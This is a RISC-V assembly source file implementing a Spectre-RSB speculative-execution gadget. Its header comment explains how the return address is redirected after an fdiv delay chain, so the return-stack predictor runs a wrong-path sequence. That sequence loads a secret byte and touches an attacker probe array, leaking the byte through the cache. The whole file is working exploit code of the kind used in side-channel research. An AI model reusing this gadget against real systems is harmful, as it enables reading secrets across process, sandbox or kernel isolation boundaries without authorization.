# Spectre-RSB gadget.
#
# frameDump() returns to whatever 40(sp) holds, but only after an fdiv chain
# has delayed the target.  The RAS predicts the return to the instruction
# after the call (specFunc+...), so the leak gadget below runs speculatively.
# Architecturally the return goes to .Lsafe, which unwinds the frame.
#
# specFunc(base, addr): base is the attacker probe array for this round,
# addr points at the secret byte.  The wrong path loads the byte and touches
# base[byte * 64].

    .text
    .globl frameDump
    .type frameDump, @function
frameDump:
    ld ra, 40(sp)
    addi ra, ra, -2
    li t1, 2
    slli t2, t1, 4
    fcvt.s.lu fa4, t1
    fcvt.s.lu fa5, t2
    fdiv.s fa5, fa5, fa4
    fdiv.s fa5, fa5, fa4
    fdiv.s fa5, fa5, fa4
    fdiv.s fa5, fa5, fa4
    fcvt.lu.s t2, fa5, rtz
    add ra, ra, t2
    ret
    .size frameDump, .-frameDump

    .globl specFunc
    .type specFunc, @function
specFunc:
    addi sp, sp, -48
    la t0, .Lsafe
    sd t0, 40(sp)
    sd ra, 32(sp)
    call frameDump

    /* Wrong path starts here. */
    lbu t0, 0(a1)
    slli t0, t0, 6
    add t1, a0, t0
    lbu t2, 0(t1)
    .rept 8
    nop
    .endr

.Lsafe:
    ld ra, 32(sp)
    addi sp, sp, 48
    ret
    .size specFunc, .-specFunc
